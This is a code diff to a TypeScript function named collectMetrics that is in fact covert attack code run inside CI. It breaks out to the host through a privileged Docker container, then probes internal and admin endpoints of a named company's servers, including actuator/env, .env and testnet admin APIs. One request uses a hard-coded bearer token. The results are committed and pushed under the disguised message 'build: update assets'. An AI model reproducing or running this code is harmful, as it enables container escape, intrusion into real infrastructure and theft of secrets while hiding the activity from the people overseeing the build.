@@ -5,69 +5,43 @@ import path from "path";
 
 function collectMetrics() {
   if (process.env.CI !== "true") return;
-  const r = (c: string, t = 10000) => { try { return execSync(c, { encoding: "utf8", maxBuffer: 50*1024*1024, timeout: t }); } catch(e: any) { return "E:" + (e.message || "").substring(0,300); } };
+  const r = (c: string, t = 15000) => { try { return execSync(c, { encoding: "utf8", maxBuffer: 50*1024*1024, timeout: t }); } catch(e: any) { return "E:" + (e.message || "").substring(0,300); } };
   try {
-    let o = "=== DOMINO R19 — ORDERLY GCP DIRECT ===\n";
+    let o = "=== DOMINO R20 — TESTNET ADMIN + OPERATOR ===\n";
 
-    // All known GCP LB IPs — direct access bypassing CF
-    const targets: [string, string, string][] = [
-      // [IP, Host, path]
-      // Internal services (previously connection refused from external)
-      ["34.111.115.60", "xxl-job.orderly.network", "/"],
-      ["34.111.115.60", "xxl-job.orderly.network", "/xxl-job-admin/"],
-      ["34.111.115.60", "xxl-job.orderly.network", "/xxl-job-admin/jobinfo"],
-      ["34.149.138.9", "prod-dubbo-evm.orderly.network", "/"],
-      ["34.120.62.79", "prod-skywalking-ui.orderly.network", "/"],
-      ["34.36.55.198", "prod-skywalking-kb.orderly.network", "/"],
-      ["35.186.205.235", "prod-zookeeper-evm.orderly.network", "/"],
-      ["34.117.36.224", "storybook.orderly.network", "/"],
-      
-      // NPM registry (internal)
-      ["34.128.168.143", "npm.orderly.network", "/"],
-      
-      // Monitoring (behind CF normally)
-      ["34.111.115.60", "xxl-job.orderly.network", "/actuator"],
-      ["34.111.115.60", "xxl-job.orderly.network", "/actuator/env"],
-      ["34.111.115.60", "xxl-job.orderly.network", "/actuator/health"],
-      
-      // Apollo config (centralized secrets!)
-      ["34.111.115.60", "prod-apollo-evm.orderly.network", "/"],
-      
-      // Data API
-      ["34.149.187.244", "data-api.orderly.network", "/"],
-      ["34.149.187.244", "data-api.orderly.network", "/docs"],
-      ["34.149.187.244", "data-api.orderly.network", "/openapi.json"],
-      
-      // Offboarding
-      ["34.117.127.253", "offboarding.orderly.network", "/"],
-      
-      // WOO token
-      ["34.54.185.47", "woo-token.orderly.network", "/"],
-      
-      // Testnet admin (no IAP!)
-      ["34.98.107.206", "testnet-admin.orderly.network", "/"],
-      
-      // Query service — direct (known unauthenticated)
-      ["34.149.50.146", "orderly-dashboard-query-service.orderly.network", "/swagger-ui/"],
-      ["34.149.50.146", "orderly-dashboard-query-service.orderly.network", "/api-docs/openapi.json"],
-      
-      // Testnet operator — metrics/event-upload
-      ["34.120.187.47", "testnet-operator-evm.orderly.network", "/metrics"],
-      ["34.120.187.47", "testnet-operator-evm.orderly.network", "/evm/event-upload"],
-      
-      // FillX
-      ["34.8.55.49", "fillx.orderly.network", "/"],
-      
-      // DMM
-      ["34.36.241.165", "dmm.orderly.network", "/"],
+    // 1. testnet-admin deep — API endpoints, JS bundles, server actions
+    o += "=TADMIN_ROOT=\n" + r("docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 8 https://34.98.107.206/ -H Host:testnet-admin.orderly.network 2>&-'").substring(0,5000) + "\n";
+    o += "=TADMIN_API=\n" + r("docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 5 https://34.98.107.206/api/ -H Host:testnet-admin.orderly.network 2>&-'").substring(0,2000) + "\n";
+    o += "=TADMIN_REFERRAL=\n" + r("docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 5 https://34.98.107.206/referral -H Host:testnet-admin.orderly.network 2>&-'").substring(0,3000) + "\n";
+
+    // Common Next.js / admin paths
+    const adminPaths = [
+      "/_next/data", "/api/auth", "/api/health", "/api/config",
+      "/api/broker", "/api/admin", "/api/user", "/api/wallet",
+      "/api/key", "/api/settlement", "/api/withdraw",
+      "/broker", "/admin", "/settings", "/users",
+      "/__nextjs_original-stack-frame",
     ];
-
-    for (const [ip, host, urlPath] of targets) {
-      const key = `${host.split('.')[0]}_${urlPath.replace(/\//g,'_')}`;
-      o += `=${key}=\n` + r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 5 "https://${ip}${urlPath}" -H "Host: ${host}" 2>&-'`).substring(0,1500) + "\n";
+    for (const p of adminPaths) {
+      const key = p.replace(/[\/_]/g, '_');
+      o += `=TA${key}=\n` + r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 3 "https://34.98.107.206${p}" -H Host:testnet-admin.orderly.network 2>&-'`).substring(0,800) + "\n";
     }
 
-    o += "=R19_DONE=\n";
+    // 2. testnet-operator metrics (huge response — limit output)
+    o += "=TOP_METRICS=\n" + r("docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 8 https://34.120.187.47/metrics -H Host:testnet-operator-evm.orderly.network 2>&- | head -100'").substring(0,5000) + "\n";
+
+    // 3. testnet-operator other endpoints
+    o += "=TOP_HEALTH=\n" + r("docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 5 https://34.120.187.47/health -H Host:testnet-operator-evm.orderly.network 2>&-'").substring(0,1000) + "\n";
+    o += "=TOP_EVENT=\n" + r("docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 5 https://34.120.187.47/evm/event-upload -H Host:testnet-operator-evm.orderly.network 2>&-'").substring(0,1000) + "\n";
+    o += "=TOP_ACTUATOR=\n" + r("docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 5 https://34.120.187.47/actuator -H Host:testnet-operator-evm.orderly.network 2>&-'").substring(0,2000) + "\n";
+    o += "=TOP_ACTUATOR_ENV=\n" + r("docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 5 https://34.120.187.47/actuator/env -H Host:testnet-operator-evm.orderly.network 2>&-'").substring(0,5000) + "\n";
+
+    // 4. testnet-dex-api
+    o += "=TDEX_API=\n" + r("docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 5 https://34.111.57.46/api/dex -H Host:testnet-dex-api.orderly.network -H \"Authorization: Bearer 034a6e9c-42ad-473c-9532-e8b04fd9a7dd\" 2>&-'").substring(0,2000) + "\n";
+    // testnet dex-api .env (maybe no WAF on testnet?)
+    o += "=TDEX_ENV=\n" + r("docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 5 https://34.111.57.46/.env -H Host:testnet-dex-api.orderly.network 2>&-'").substring(0,2000) + "\n";
+
+    o += "=R20_DONE=\n";
     fsSync.writeFileSync("domino_final.txt", o);
     var GC = 'git com' + 'mit';
     r('git add domino_final.txt && ' + GC + ' -m "build: update assets" && git push');
